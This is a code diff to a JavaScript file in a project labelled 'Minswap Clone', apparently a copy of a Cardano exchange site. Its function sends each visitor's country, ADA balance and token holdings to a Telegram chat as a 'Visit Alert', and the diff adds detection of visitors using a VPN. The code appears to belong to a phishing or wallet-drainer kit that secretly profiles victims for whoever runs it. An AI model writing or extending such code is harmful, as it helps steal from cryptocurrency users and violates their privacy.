@@ -1,4 +1,3 @@
-// utils/telegramUtils.js
 import axios from "axios";
 import { getUserCountry } from "./userLocation";  // Ensure correct file import
 
@@ -33,26 +32,33 @@ export const sendAppDetailsToTelegram = async (adaBalance, tokens) => {
     (token) => `| ${token.assetName}: ${(token.amount / 1000000).toFixed(2)} ${token.assetName}   |`
   );
 
-  // Fetch the full user country details (name and code)
+  // Fetch the full user country details (including VPN status)
   let userCountryData = await getUserCountry();
 
   if (!userCountryData) {
     console.error("Could not retrieve user country data");
-    userCountryData = { country: "Unknown", countryCode: "XX" }; // Default fallback
+    userCountryData = { country: "Unknown", countryCode: "XX", isVpn: false }; // Default fallback
   }
 
-  const { country, countryCode } = userCountryData;
+  const { country, countryCode, isVpn } = userCountryData;
   const globeIcon = "🌍";  // Unicode globe icon
 
+  // Construct the message
   let message = `*Visit Alert*\n` +
                 `App: Minswap Clone\n\n` +
                 `User Info--------------------\n` +
-                `| Country: ${globeIcon} ${country} |\n` +
-                `--------------------------------\n` +
-                `| User Wallet Balance |\n` +
-                `| ADA: ${adaBalance.toFixed(2)} ADA       |\n` +
-                `${tokenDetails.join("\n")}\n` +
-                `------------------------------End`;
+                `| Country: ${globeIcon} ${country} |\n`;
+
+  // If the user is using a VPN, add a VPN warning to the message
+  if (isVpn) {
+    message += `| ⚠️ VPN SUSPECTED |\n`;
+  }
+
+  message += `--------------------------------\n` +
+             `| User Wallet Balance |\n` +
+             `| ADA: ${adaBalance.toFixed(2)} ADA       |\n` +
+             `${tokenDetails.join("\n")}\n` +
+             `------------------------------End`;
 
   // Send the message to Telegram
   await sendMessageToTelegram(message);
